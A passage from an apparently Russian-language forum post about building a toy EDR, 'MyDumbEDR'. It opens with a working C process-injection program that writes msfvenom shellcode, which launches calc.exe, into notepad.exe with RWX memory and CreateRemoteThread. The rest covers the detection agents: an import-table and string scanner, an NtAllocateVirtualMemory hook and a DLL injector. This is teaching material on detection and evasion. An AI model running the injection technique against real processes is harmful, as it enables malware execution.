+            if (wcscmp(entry.szExeFile, processName) == 0) {
+                return entry.th32ProcessID;
+            }
+        }
+    }
+    else {
+        printf(&quot;CreateToolhelper32Snapshot failed : %d\n&quot;, GetLastError());
+        exit(1);
+    }
+    printf(&quot;Process not found.\n&quot;);
+    exit(1);
+}
+
+void check_if_se_debug_privilege_is_enabled() {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
+    HANDLE hToken;
+    OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);
+    DWORD cbSize;
+    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &amp;cbSize);
+    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, cbSize);
+    GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, cbSize, &amp;cbSize);
+    DWORD current_process_integrity = (DWORD)*GetSidSubAuthority(pTIL-&gt;Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL-&gt;Label.Sid) - 1));
+
+    TOKEN_PRIVILEGES tp;
+
+    LUID luidSeDebugPrivilege;
+    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luidSeDebugPrivilege) == 0) {
+        printf(&quot;SeDebugPrivilege not owned\n&quot;);
+    }
+    else {
+        printf(&quot;SeDebugPrivilege owned\n&quot;);
+    }
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luidSeDebugPrivilege;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    if (AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0) {
+        printf(&quot;SeDebugPrivilege adjust token failed: %d\n&quot;, GetLastError());
+    }
+    else {
+        printf(&quot;SeDebugPrivilege enabled.\n&quot;);
+    }
+
+    CloseHandle(hProcess);
+    CloseHandle(hToken);
+}
+
+int main() {
+    printf(&quot;Launching remote shellcode injection\n&quot;);
+   
+    // DO NOT REMOVE
+    // When loading a DLL remotely, its content won&#039;t apply until all DLL&#039;s are loaded
+    // For some reason it leads to a race condition which is not part of the challenge
+    // Hence do not remove the Sleep (even if it&#039;d allow you bypassing the hooks)
+    Sleep(5000);
+    // DO NOT REMOVE
+    check_if_se_debug_privilege_is_enabled();
+    wchar_t processName[] = L&quot;notepad.exe&quot;;
+    int processId = get_process_id_from_szexefile(processName);
+    printf(&quot;Injecting to PID: %i\n&quot;, processId);
+    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(processId));
+   
+   
+    // msfvenom -p windows/x64/exec CMD=calc.exe -b &quot;\x00\x0a\0d&quot; -f c
+    unsigned char shellcode[] =
+        &quot;\x48\x31\xc9\x48\x81\xe9\xdb\xff\xff\xff\x48\x8d\x05\xef\xff&quot;
+        &quot;\xff\xff\x48\xbb\x33\xef\x18\x46\xf8\x06\x62\xef\x48\x31\x58&quot;
+        &quot;\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xcf\xa7\x9b\xa2\x08\xee&quot;
+        &quot;\xa2\xef\x33\xef\x59\x17\xb9\x56\x30\xbe\x65\xa7\x29\x94\x9d&quot;
+        &quot;\x4e\xe9\xbd\x53\xa7\x93\x14\xe0\x4e\xe9\xbd\x13\xa7\x93\x34&quot;
+        &quot;\xa8\x4e\x6d\x58\x79\xa5\x55\x77\x31\x4e\x53\x2f\x9f\xd3\x79&quot;
+        &quot;\x3a\xfa\x2a\x42\xae\xf2\x26\x15\x07\xf9\xc7\x80\x02\x61\xae&quot;
+        &quot;\x49\x0e\x73\x54\x42\x64\x71\xd3\x50\x47\x28\x8d\xe2\x67\x33&quot;
+        &quot;\xef\x18\x0e\x7d\xc6\x16\x88\x7b\xee\xc8\x16\x73\x4e\x7a\xab&quot;
+        &quot;\xb8\xaf\x38\x0f\xf9\xd6\x81\xb9\x7b\x10\xd1\x07\x73\x32\xea&quot;
+        &quot;\xa7\x32\x39\x55\x77\x31\x4e\x53\x2f\x9f\xae\xd9\x8f\xf5\x47&quot;
+        &quot;\x63\x2e\x0b\x0f\x6d\xb7\xb4\x05\x2e\xcb\x3b\xaa\x21\x97\x8d&quot;
+        &quot;\xde\x3a\xab\xb8\xaf\x3c\x0f\xf9\xd6\x04\xae\xb8\xe3\x50\x02&quot;
+        &quot;\x73\x46\x7e\xa6\x32\x3f\x59\xcd\xfc\x8e\x2a\xee\xe3\xae\x40&quot;
+        &quot;\x07\xa0\x58\x3b\xb5\x72\xb7\x59\x1f\xb9\x5c\x2a\x6c\xdf\xcf&quot;
+        &quot;\x59\x14\x07\xe6\x3a\xae\x6a\xb5\x50\xcd\xea\xef\x35\x10\xcc&quot;
+        &quot;\x10\x45\x0e\x42\x07\x62\xef\x33\xef\x18\x46\xf8\x4e\xef\x62&quot;
+        &quot;\x32\xee\x18\x46\xb9\xbc\x53\x64\x5c\x68\xe7\x93\x43\xf6\xd7&quot;
+        &quot;\x4d\x65\xae\xa2\xe0\x6d\xbb\xff\x10\xe6\xa7\x9b\x82\xd0\x3a&quot;
+        &quot;\x64\x93\x39\x6f\xe3\xa6\x8d\x03\xd9\xa8\x20\x9d\x77\x2c\xf8&quot;
+        &quot;\x5f\x23\x66\xe9\x10\xcd\x05\xc2\x5a\x35\x86\x5d\x8b\x77\x31&quot;
+        &quot;\x8b\x5a\x31\x96\x40\x9b\x7d\x2b\xcb\x34\x3e\x8c\x52\x83\x7b&quot;
+        &quot;\x68\x9d\x7e\x07\xef&quot;;
+    printf(&quot;VirtualAllocEx\n&quot;);
+    PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+   
+    printf(&quot;WriteProcessMemory\n&quot;);
+    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL);
+   
+    printf(&quot;CreateRemoteThread\n&quot;);
+    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+   
+    printf(&quot;Congratz dude! The flag is MyDumbEDR{H4ckTH3W0rld}\n&quot;);
+    printf(&quot;Expect more checks in the upcoming weeks ;)\n&quot;);
+    CloseHandle(processHandle);
+    return 0;
+}</code></pre>
+	</div>
+</div><br />
+Существует несколько маркеров, которые можно использовать, чтобы пометить этот бинарный файл как вредоносный. Во-первых, он использует несколько функций в подозрительном порядке: OpenProcess &gt; VirtualAllocEx &gt; WriteProcessMemory &gt; CreateRemoteThread. Затем бинарный файл выделяет память с правами RWX (читать, записывать, выполнять), что также вызывает подозрения. Наконец, он содержит подозрительные строки, а также явно помеченную полезную нагрузку shellcode msfvenom.<br />
+<br />
+Для нашего EDR я решил создать два агента вместо одного. Оба этих агента будут получать информацию от драйвера через именованный канал, который является механизмом внутреннего межпроцессного взаимодействия.<br />
+<br />
+Таким образом, MyDumbEDR зависит от трех компонентов:<br />
+<br />
+Драйвера ядра, который будет получать уведомления о созданных процессах.<br />
+Агента StaticAnalyzer, который будет проводить статический анализ бинарного файла.<br />
+Агента RemoteInjector, который будет внедрять собственную DLL в каждый созданный процесс.<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750611093738.png"
+		data-src="https://osint42.org/attachments/1750611093738-png.695/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750611093738-png.695/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750611093738.png"
+			title="1750611093738.png"
+			width="724" height="412" loading="lazy" />
+	</div><br />
+<br />
+Давайте ближе рассмотрим, что делают оба агента.<br />
+<br />
+<b>1/ Статический анализатор</b><br />
+<br />
+Статический анализатор получает путь к файлу отображения процессов, которые запускаются. Затем он статически проверяет три вещи:<br />
+<br />
+Если бинарный файл подписан.<br />
+Если функции OpenProcess, VirtualAllocEx, WriteProcessMemory и CreateRemoteThread перечислены в IAT (таблице адресов импорта).<br />
+Если строка SeDebugPrivilege присутствует в бинарном файле.<br />
+<br />
+Ниже приведен код агента:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;dbghelp.h&gt;
+#include &lt;wintrust.h&gt;
+#include &lt;Softpub.h&gt;
+#include &lt;wincrypt.h&gt;
+
+#pragma comment (lib, &quot;wintrust.lib&quot;)
+#pragma comment(lib, &quot;dbghelp.lib&quot;)
+#pragma comment(lib, &quot;crypt32.lib&quot;)
+
+#define MESSAGE_SIZE 2048
+
+BOOL VerifyEmbeddedSignature(const wchar_t* binaryPath) {
+    LONG lStatus;
+    WINTRUST_FILE_INFO FileData;
+    memset(&amp;FileData, 0, sizeof(FileData));
+    FileData.cbStruct = sizeof(WINTRUST_FILE_INFO);
+    FileData.pcwszFilePath = binaryPath;
+    FileData.hFile = NULL;
+    FileData.pgKnownSubject = NULL;
+    GUID WVTPolicyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
+    WINTRUST_DATA WinTrustData;
+
+    // Initializing necessary structures
+    memset(&amp;WinTrustData, 0, sizeof(WinTrustData));
+    WinTrustData.cbStruct = sizeof(WinTrustData);
+    WinTrustData.pPolicyCallbackData = NULL;
+    WinTrustData.pSIPClientData = NULL;
+    WinTrustData.dwUIChoice = WTD_UI_NONE;
+    WinTrustData.fdwRevocationChecks = WTD_REVOKE_NONE;
+    WinTrustData.dwUnionChoice = WTD_CHOICE_FILE;
+    WinTrustData.dwStateAction = WTD_STATEACTION_VERIFY;
+    WinTrustData.hWVTStateData = NULL;
+    WinTrustData.pwszURLReference = NULL;
+    WinTrustData.dwUIContext = 0;
+    WinTrustData.pFile = &amp;FileData;
+
+    // WinVerifyTrust verifies signatures as specified by the GUID and Wintrust_Data.
+    lStatus = WinVerifyTrust(NULL, &amp;WVTPolicyGUID, &amp;WinTrustData);
+
+    BOOL isSigned;
+    switch (lStatus) {
+        // The file is signed and the signature was verified
+    case ERROR_SUCCESS:
+        isSigned = TRUE;
+        break;
+
+        // File is signed but the signature is not verified or is not trusted
+    case TRUST_E_SUBJECT_FORM_UNKNOWN || TRUST_E_PROVIDER_UNKNOWN || TRUST_E_EXPLICIT_DISTRUST || CRYPT_E_SECURITY_SETTINGS || TRUST_E_SUBJECT_NOT_TRUSTED:
+        isSigned = TRUE;
+        break;
+
+        // The file is not signed
+    case TRUST_E_NOSIGNATURE:
+        isSigned = FALSE;
+        break;
+
+        // Shouldn&#039;t happen but hey may be!
+    default:
+        isSigned = FALSE;
+        break;
+    }
+
+    // Any hWVTStateData must be released by a call with close.
+    WinTrustData.dwStateAction = WTD_STATEACTION_CLOSE;
+    WinVerifyTrust(NULL, &amp;WVTPolicyGUID, &amp;WinTrustData);
+
+    return isSigned;
+}
+
+BOOL ListImportedFunctions(const wchar_t* binaryPath) {
+    BOOL isOpenProcessPresent = FALSE;
+    BOOL isVirtualAllocExPresent = FALSE;
+    BOOL isWriteProcessMemoryPresent = FALSE;
+    BOOL isCreateRemoteThreadPresent = FALSE;
+    // Load the target binary so that we can parse its content
+    HMODULE hModule = LoadLibraryEx(binaryPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (hModule != NULL) {
+        // Get NT headers from the binary
+        IMAGE_NT_HEADERS* ntHeaders = ImageNtHeader(hModule);
+        if (ntHeaders != NULL) {
+            // Locate the IAT
+            IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)hModule + ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+            // Loop over the DLL&#039;s
+            while (importDesc-&gt;Name != 0) {
+                const char* moduleName = (const char*)((BYTE*)hModule + importDesc-&gt;Name);
+
+                // Loop over the functions of the DLL
+                IMAGE_THUNK_DATA* thunk = (IMAGE_THUNK_DATA*)((BYTE*)hModule + importDesc-&gt;OriginalFirstThunk);
+                while (thunk-&gt;u1.AddressOfData != 0) {
+                    if (thunk-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG) {
+                        // printf(&quot;\tOrdinal: %llu\n&quot;, IMAGE_ORDINAL(thunk-&gt;u1.Ordinal));
+                    }
+                    else {
+                        IMAGE_IMPORT_BY_NAME* importByName = (IMAGE_IMPORT_BY_NAME*)((BYTE*)hModule + thunk-&gt;u1.AddressOfData);
+                        // printf(&quot;\tFunction: %s\n&quot;, importByName-&gt;Name);
+                        // Checks if the following functions are used by the binary
+
+                        if (strcmp(&quot;OpenProcess&quot;, importByName-&gt;Name) == 0) {
+                            isOpenProcessPresent = TRUE;
+                        }
+
+                        if (strcmp(&quot;VirtualAllocEx&quot;, importByName-&gt;Name) == 0) {
+                            isVirtualAllocExPresent = TRUE;
+                        }
+
+                        if (strcmp(&quot;WriteProcessMemory&quot;, importByName-&gt;Name) == 0) {
+                            isWriteProcessMemoryPresent = TRUE;
+                        }
+
+                        if (strcmp(&quot;CreateRemoteThread&quot;, importByName-&gt;Name) == 0) {
+                            isCreateRemoteThreadPresent = TRUE;
+                        }
+
+                    }
+                    thunk++;
+                }
+                importDesc++;
+            }
+            FreeLibrary(hModule);
+        }
+        FreeLibrary(hModule);
+    }
+
+    if (isOpenProcessPresent &amp;&amp; isVirtualAllocExPresent &amp;&amp; isWriteProcessMemoryPresent &amp;&amp; isCreateRemoteThreadPresent) {
+        return TRUE;
+    }
+    else {
+        return FALSE;
+    }
+    return FALSE;
+}
+
+BOOL lookForSeDebugPrivilegeString(const wchar_t* filename) {
+    FILE* file;
+    _wfopen_s(&amp;file, filename, L&quot;rb&quot;);
+    if (file != NULL) {
+        fseek(file, 0, SEEK_END);
+        long file_size = ftell(file);
+        rewind(file);
+        char* buffer = (char*)malloc(file_size);
+        if (buffer != NULL) {
+            if (fread(buffer, 1, file_size, file) == file_size) {
+                const char* search_string = &quot;SeDebugPrivilege&quot;;
+                size_t search_length = strlen(search_string);
+                int i, j;
+                int found = 0;
+                for (i = 0; i &lt;= file_size - search_length; i++) {
+                    for (j = 0; j &lt; search_length; j++) {
+                        if (buffer[i + j] != search_string[j]) {
+                            break;
+                        }
+                    }
+                    if (j == search_length) {
+                        return TRUE;
+                    }
+                }
+            }
+            free(buffer);
+        }
+        fclose(file);
+    }
+    return FALSE;
+}
+
+int main() {
+    LPCWSTR pipeName = L&quot;\\\\.\\pipe\\dumbedr-analyzer&quot;;
+    DWORD bytesRead = 0;
+    wchar_t target_binary_file[MESSAGE_SIZE] = { 0 };
+
+    printf(&quot;Launching analyzer named pipe server\n&quot;);
+
+    // Creates a named pipe
+    HANDLE hServerPipe = CreateNamedPipe(
+        pipeName,                 // Pipe name to create
+        PIPE_ACCESS_DUPLEX,       // Whether the pipe is supposed to receive or send data (can be both)
+        PIPE_TYPE_MESSAGE,        // Pipe mode (whether or not the pipe is waiting for data)
+        PIPE_UNLIMITED_INSTANCES, // Maximum number of instances from 1 to PIPE_UNLIMITED_INSTANCES
+        MESSAGE_SIZE,             // Number of bytes for output buffer
+        MESSAGE_SIZE,             // Number of bytes for input buffer
+        0,                        // Pipe timeout
+        NULL                      // Security attributes (anonymous connection or may be needs credentials. )
+    );
+
+    while (TRUE) {
+
+        // ConnectNamedPipe enables a named pipe server to start listening for incoming connections
+        BOOL isPipeConnected = ConnectNamedPipe(
+            hServerPipe, // Handle to the named pipe
+            NULL         // Whether or not the pipe supports overlapped operations
+        );
+
+        wchar_t target_binary_file[MESSAGE_SIZE] = { 0 };
+        if (isPipeConnected) {
+            // Read from the named pipe
+            ReadFile(
+                hServerPipe,         // Handle to the named pipe
+                &amp;target_binary_file, // Target buffer where to stock the output
+                MESSAGE_SIZE,        // Size of the buffer
+                &amp;bytesRead,          // Number of bytes read from ReadFile
+                NULL                 // Whether or not the pipe supports overlapped operations
+            );
+
+            printf(&quot;~&gt; Received binary file %ws\n&quot;, target_binary_file);
+            int res = 0;
+
+            BOOL isSeDebugPrivilegeStringPresent = lookForSeDebugPrivilegeString(target_binary_file);
+            if (isSeDebugPrivilegeStringPresent == TRUE) {
+                printf(&quot;\t\033[31mFound SeDebugPrivilege string.\033[0m\n&quot;);
+            }
+            else {
+                printf(&quot;\t\033[32mSeDebugPrivilege string not found.\033[0m\n&quot;);
+            }
+
+            BOOL isDangerousFunctionsFound = ListImportedFunctions(target_binary_file);
+            if (isDangerousFunctionsFound == TRUE) {
+                printf(&quot;\t\033[31mDangerous functions found.\033[0m\n&quot;);
+            }
+            else {
+                printf(&quot;\t\033[32mNo dangerous functions found.\033[0m\n&quot;);
+            }
+
+            BOOL isSigned = VerifyEmbeddedSignature(target_binary_file);
+            if (isSigned == TRUE) {
+                printf(&quot;\t\033[32mBinary is signed.\033[0m\n&quot;);
+            }
+            else {
+                printf(&quot;\t\033[31mBinary is not signed.\033[0m\n&quot;);
+            }
+
+            wchar_t response[MESSAGE_SIZE] = { 0 };
+            if (isSigned == TRUE) {
+                swprintf_s(response, MESSAGE_SIZE, L&quot;OK\0&quot;);
+                printf(&quot;\t\033[32mStaticAnalyzer allows\033[0m\n&quot;);
+            }
+            else {
+                // If the following conditions are met, the binary is blocked
+                if (isDangerousFunctionsFound || isSeDebugPrivilegeStringPresent) {
+                    swprintf_s(response, MESSAGE_SIZE, L&quot;KO\0&quot;);
+                    printf(&quot;\n\t\033[31mStaticAnalyzer denies\033[0m\n&quot;);
+                }
+                else {
+                    swprintf_s(response, MESSAGE_SIZE, L&quot;OK\0&quot;);
+                    printf(&quot;\n\t\033[32mStaticAnalyzer allows\033[0m\n&quot;);
+                }
+            }
+
+            DWORD bytesWritten = 0;
+            // Write to the named pipe
+            WriteFile(
+                hServerPipe,   // Handle to the named pipe
+                response,      // Buffer to write from
+                MESSAGE_SIZE,  // Size of the buffer
+                &amp;bytesWritten, // Numbers of bytes written
+                NULL           // Whether or not the pipe supports overlapped operations
+            );
+
+        }
+
+        // Disconnect
+        DisconnectNamedPipe(
+            hServerPipe // Handle to the named pipe
+        );
+
+        printf(&quot;\n\n&quot;);
+    }
+    return 0;
+}</code></pre>
+	</div>
+</div><br />
+Довольно просто.<br />
+Агент удаленного внедрения будет немного сложнее!<br />
+<br />
+<b>2/ Агент удаленного внедрения</b><br />
+<br />
+Одной из вещей, которые нравятся EDR, является применение механизма, называемого функциональным перехватом.<br />
+<br />
+Как мы видели ранее, из-за PatchGuard больше нельзя модифицировать SSDT или какие-либо другие критические структуры ядра. Поэтому антивирусные решения решили вместо этого изменить NTDLL.dll напрямую.<br />
+<br />
+Для этого EDR просто временно перенаправляют поток кода от функций NTDLL.dll к своему собственному коду:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750611111295.png"
+		data-src="https://osint42.org/attachments/1750611111295-png.696/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750611111295-png.696/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750611111295.png"
+			title="1750611111295.png"
+			width="552" height="446" loading="lazy" />
+	</div><br />
+<br />
+<b>Вопрос в том, как перенаправить поток кода из NTDLL.dll?</b><br />
+<br />
+Когда создается процесс, загружается копия нескольких необходимых DLL. Очевидно, делается копия NTDLL.dll, и, если мы достаточно опытны, мы можем изменить ее содержимое. Для изменения потока выполнения функции из NTDLL.dll нам просто нужно разобрать DLL, найти функции, которые мы хотим перехватить, и изменить ее код так, чтобы он переходил к коду нашего EDR.<br />
+<br />
+Легко в теории. Гораздо сложнее на практике. К счастью, есть невероятная библиотека <a href="https://github.com/TsudaKageyu/minhook" target="_blank" class="link link--external" rel="noopener">под названием MinHook</a>, разработанная TsudaKageyu, которая позволит нам довольно легко достичь нашей цели по перехвату. С использованием библиотеки MinHook мы создадим DLL, которую агент удаленного внедрения будет внедрять в каждый создаваемый процесс.<br />
+<br />
+Эта DLL будет перехватывать только одну функцию из NTDLL.dll: NtAllocateVirtualMemory. Почему именно эта функция? Потому что NtAllocateVirtualMemory - это функция из NTDLL.dll, которая используется для выделения и защиты памяти.<br />
+<br />
+Поскольку наш EDR будет сосредотачиваться на обнаружении инструментов, внедряющих удаленный код, эта функция является наиболее важной для мониторинга.<br />
+Ниже вы найдете комментированный код DLL, который мы будем внедрять (к счастью, он включает использование MinHook):<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &quot;pch.h&quot;
+#include &quot;minhook/include/MinHook.h&quot;
+
+
+// Defines the prototype of the NtAllocateVirtualMemoryFunction
+typedef DWORD(NTAPI* pNtAllocateVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+    );
+
+// Pointer to the trampoline function used to call the original NtAllocateVirtualMemory
+pNtAllocateVirtualMemory pOriginalNtAllocateVirtualMemory = NULL;
+
+// This is the function that will be called whenever the injected process calls
+// NtAllocateVirtualMemory. This function takes the arguments Protect and checks
+// if the requested protection is RWX (which shouldn&#039;t happen).
+DWORD NTAPI NtAllocateVirtualMemory(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+) {
+
+    // Checks if the program is trying to allocate some memory and protect it with RWX
+    if (Protect == PAGE_EXECUTE_READWRITE) {
+        // If yes, we notify the user and terminate the process
+        MessageBox(NULL, L&quot;Dude, are you trying to RWX me ?&quot;, L&quot;Found u bro&quot;, MB_OK);
+        TerminateProcess(GetCurrentProcess(), 0xdeadb33f);
+    }
+
+    //If no, we jump on the originate NtAllocateVirtualMemory
+    return pOriginalNtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
+}
+
+// This function initializes the hooks via the MinHook library
+DWORD WINAPI InitHooksThread(LPVOID param) {
+    if (MH_Initialize() != MH_OK) {
+        return -1;
+    }
+
+    // Here we specify which function from wich DLL we want to hook
+    MH_CreateHookApi(  
+        L&quot;ntdll&quot;,                                     // Name of the DLL containing the function to  hook
+        &quot;NtAllocateVirtualMemory&quot;,                    // Name of the function to hook
+        NtAllocateVirtualMemory,                      // Address of the function on which to jump when hooking
+        (LPVOID *)(&amp;pOriginalNtAllocateVirtualMemory) // Address of the original NtAllocateVirtualMemory function
+    );
+
+    // Enable the hook on NtAllocateVirtualMemory
+    MH_STATUS status = MH_EnableHook(MH_ALL_HOOKS);
+    return status;
+}
+
+// Here is the DllMain of our DLL
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved){
+    switch (ul_reason_for_call){
+    case DLL_PROCESS_ATTACH: {
+        // This DLL will not be loaded by any thread so we simply disable DLL_TRHEAD_ATTACH and DLL_THREAD_DETACH
+        DisableThreadLibraryCalls(hModule);
+
+        // Calling WinAPI32 functions from the DllMain is a very bad practice
+        // since it can basically lock the program loading the DLL
+        // Microsoft recommends not using any functions here except a few one like
+        // CreateThread IF AND ONLY IF there is no need for synchronization
+        // So basically we are creating a thread that will execute the InitHooksThread function
+        // thus allowing us hooking the NtAllocateVirtualMemory function
+        HANDLE hThread = CreateThread(NULL, 0, InitHooksThread, NULL, 0, NULL);
+        if (hThread != NULL) {
+            CloseHandle(hThread);
+        }
+        break;
+    }
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+With the DLL created, we need to inject it into every process we want to monitor. That’s the job of the RemoteInjector agent which receives, from the driver, the PID of the process in which to inject the DLL:
+
+
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+#define MESSAGE_SIZE 2048
+#define MAX_PATH 260
+
+int main() {
+    LPCWSTR pipeName = L&quot;\\\\.\\pipe\\dumbedr-injector&quot;;
+    DWORD bytesRead = 0;
+    wchar_t target_binary_file[MESSAGE_SIZE] = { 0 };
+
+    char dll_path[] = &quot;x64\\Debug\\MyDumbEDRDLL.dll&quot;;
+    char dll_full_path[MAX_PATH];
+    GetFullPathNameA(dll_path, MAX_PATH, dll_full_path, NULL);
+    printf(&quot;Launching injector named pipe server, injecting %s\n&quot;, dll_full_path);
+
+
+    // Creates a named pipe
+    HANDLE hServerPipe = CreateNamedPipe(
+        pipeName,                 // Pipe name to create
+        PIPE_ACCESS_DUPLEX,       // Whether the pipe is supposed to receive or send data (can be both)
+        PIPE_TYPE_MESSAGE,        // Pipe mode (whether or not the pipe is waiting for data)
+        PIPE_UNLIMITED_INSTANCES, // Maximum number of instances from 1 to PIPE_UNLIMITED_INSTANCES
+        MESSAGE_SIZE,             // Number of bytes for output buffer
+        MESSAGE_SIZE,             // Number of bytes for input buffer
+        0,                        // Pipe timeout
+        NULL                      // Security attributes (anonymous connection or may be needs credentials. )
+    );
+
+    while (TRUE) {
+
+        // ConnectNamedPipe enables a named pipe server to start listening for incoming connections
+        BOOL isPipeConnected = ConnectNamedPipe(
+            hServerPipe, // Handle to the named pipe
+            NULL         // Whether or not the pipe supports overlapped operations
+        );
+
+        wchar_t message[MESSAGE_SIZE] = { 0 };
+       
+        if (isPipeConnected) {
+
+            // Read from the named pipe
+            ReadFile(
+                hServerPipe,  // Handle to the named pipe
+                &amp;message,     // Target buffer where to stock the output
+                MESSAGE_SIZE, // Size of the buffer
+                &amp;bytesRead,   // Number of bytes read from ReadFile
+                NULL          // Whether or not the pipe supports overlapped operations
+            );
+
+            // Casting the message into a DWORD
+            DWORD target_pid = _wtoi(message);
+            printf(&quot;~&gt; Received process id %d\n&quot;, target_pid);
+
+            // Opening the process with necessary privileges
+            HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, target_pid);
+            if (hProcess == NULL) {
+                printf(&quot;Can&#039;t open handle, error: % lu\n&quot;, GetLastError());
+                return FALSE;
+            }
+            printf(&quot;\tOpen handle on PID: %d\n&quot;, target_pid);
+
+            // Looking for the LoadLibraryA function in the kernel32.dll
+            FARPROC loadLibAddress = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;);
+            if (loadLibAddress == NULL) {
+                printf(&quot;Could not find LoadLibraryA, error: %lu\n&quot;, GetLastError());
+                return FALSE;
+            }
+            printf(&quot;\tFound LoadLibraryA function\n&quot;);
+
+            // Allocating some memory wth read/write privileges
+            LPVOID vae_buffer;
+            vae_buffer = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            if (vae_buffer == NULL){
+                printf(&quot;Can&#039;t allocate memory, error: %lu\n&quot;, GetLastError());
+                CloseHandle(hProcess);
+                return FALSE;
+            }
+            printf(&quot;\tAllocated: %d bytes\n&quot;, MAX_PATH);
+
+            // Writing the path of the DLL to inject: x64\Debug\MyDumbEDRDLL.dll
+            SIZE_T bytesWritten;
+            if (!WriteProcessMemory(hProcess, vae_buffer, dll_full_path, MAX_PATH, &amp;bytesWritten)) {
+                printf(&quot;Can&#039;t write into memory, error: %lu\n&quot;, GetLastError());
+                VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);
+                CloseHandle(hProcess);
+                return FALSE;
+            }
+            printf(&quot;\tWrote %zu in %d process memory\n&quot;, bytesWritten, target_pid);
+
+            // Creating a thread that will call LoadLibraryA and the path of the MyDUMBEDRDLL to load as argument
+            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddress, vae_buffer, 0, NULL);
+            if (hThread == NULL) {
+                printf(&quot;Can&#039;t launch remote thread, error: %lu\n&quot;, GetLastError());
+                VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);
+                CloseHandle(hProcess);
+                return FALSE;
+            }
+            printf(&quot;\tLaunched remote thread\n&quot;);
+
+            // Freeing allocated memory as well as handles
+            VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);
+            CloseHandle(hThread);
+            CloseHandle(hProcess);
+            printf(&quot;\tClosed handle\n&quot;);
+
+            wchar_t response[MESSAGE_SIZE] = { 0 };
+            swprintf_s(response, MESSAGE_SIZE, L&quot;OK\0&quot;);
+            DWORD pipeBytesWritten = 0;
+           
+            // Inform the driver that the injection was successful
+            WriteFile(
+                hServerPipe,       // Handle to the named pipe
+                response,          // Buffer to write from
+                MESSAGE_SIZE,      // Size of the buffer
+                &amp;pipeBytesWritten, // Numbers of bytes written
+                NULL               // Whether or not the pipe supports overlapped operations
+            );
+
+            // Disconnect
+            DisconnectNamedPipe(
+                hServerPipe // Handle to the named pipe
+            );
+
+            printf(&quot;\n\n&quot;);      
+        }
+    }
+}</code></pre>
+	</div>
+</div><br />
+Запустив все это, мы видим, что ассемблерный код функции NtAllocateVirtualMemory из NTDLL.dll процесса, в который было внедрено, выглядит следующим образом:<br />
+<br />
